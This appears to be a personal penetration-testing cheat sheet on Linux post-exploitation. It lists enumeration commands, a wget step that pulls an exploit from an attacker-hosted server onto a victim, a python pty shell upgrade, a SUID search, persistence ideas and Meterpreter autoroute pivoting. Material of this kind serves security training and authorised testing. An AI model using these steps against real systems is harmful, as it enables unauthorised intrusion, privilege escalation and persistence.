# Linux Post Exploitation


## Enumeration

    uname -a
       
    ps -aux 
    
  - linpeas
    
    
  - [LinEnum](https://github.com/rebootuser/LinEnum)  
  
         <hostshare>/Tools/Exploit/Discovery
          
          
  - [Local Linux Enumeration](https://www.rebootuser.com/?p=1623)
  
  
  See what sudo commands you can run
  
       sudo -l

    
 
## Downloading files

    python -m SimpleHTTPServer  #Host the web server
      wget <IP>:8000/exploit     # Download to victim machine

    python -m pyftpdlib 21      #Host ftp server
      ftp <IP>
      
## Exploits

    searchsploit <linux kernel version>
   
    searchsploit <linux version>

## Upgrading basic shell to terminal 

    python -c 'import pty;pty.spawn("/bin/bash")';
    
    
## Privilege Escalation

[Privilege Escalation Cheatsheet ](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)

Check /etc/passwd for user/ group ids

    0 is typically root ( this can be <= 500) 
    
    1000+ is where new user accounts start

 **Check for SUID (set owner userId upon execution)**
 
  [SUID](https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/) gives temporary permissions to a user to run the program/file with the permission of the file owner (rather than the user who runs it). When looking at permissions the "x" for the owner will be an "s". [Past shells](https://github.com/Kahvi-0/Tools-and-Concepts/tree/master/Toolbox/Shells/SUID)
   
    find directory -user root -perm -4000 -exec ls -ldb {} \; 2>&1 | grep -v "Permission denied"


   
 
 ## Maintain persistence

  - Add user
  

  - Metasploit


  - Set a scheduled task
  
  
## Pivoting

 If pwnd target has a connection to a network that we do not have a connection to, we can set up a route on the machine to forward our traffic 
 
   - Meterpreter 
       
       Note that the routes created via meterpreter only aspply to that isntance of metasploit.
        If modules are crashing the shell when trying to scan via metasploit module, try running the scan from the compromised machine itself, then launcing targeted attacks from metasploit. 
   
         run autoroute -s <target network seen via enumeration>/CIDR
         
         run autoroute -p   #to confirm
         
       you can now test by pinging a device on the remote network
       
# Find more

  Metasploit
  
    /post/linux/


